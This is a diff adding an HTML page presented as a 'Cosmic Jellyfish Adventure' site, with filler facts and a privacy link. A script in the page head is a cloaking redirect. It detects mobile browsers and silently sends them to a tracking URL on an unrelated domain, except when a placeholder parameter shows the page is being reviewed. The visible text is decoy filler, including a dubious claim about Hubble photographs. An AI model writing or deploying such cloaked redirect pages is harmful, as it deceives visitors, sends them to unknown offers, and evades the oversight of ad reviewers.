@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventure</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 50px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        main {
+            grid-column: 2 / 3;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+        a {
+            color: #ffff00;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Jellyfish Adventure</h1>
+        </header>
+        <aside>
+            <h2>Stellar Facts</h2>
+            <ul>
+                <li>Jellyfish have existed for over 500 million years</li>
+                <li>Some jellyfish are bioluminescent</li>
+                <li>The largest jellyfish can grow up to 120 feet long</li>
+            </ul>
+        </aside>
+        <main>
+            <h2>Welcome to the Cosmic Ocean</h2>
+            <p>Embark on a mesmerizing journey through the cosmic ocean, where jellyfish float among the stars. Discover the wonders of bioluminescent creatures and the mysteries of deep space in this unique adventure.</p>
+        </main>
+        <aside>
+            <h2>Galactic Gallery</h2>
+            <p>Explore our collection of cosmic jellyfish photographs, captured by the Hubble Space Telescope.</p>
+        </aside>
+        <footer>
+            <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+        </footer>
+    </div>
+</body>
+</html>
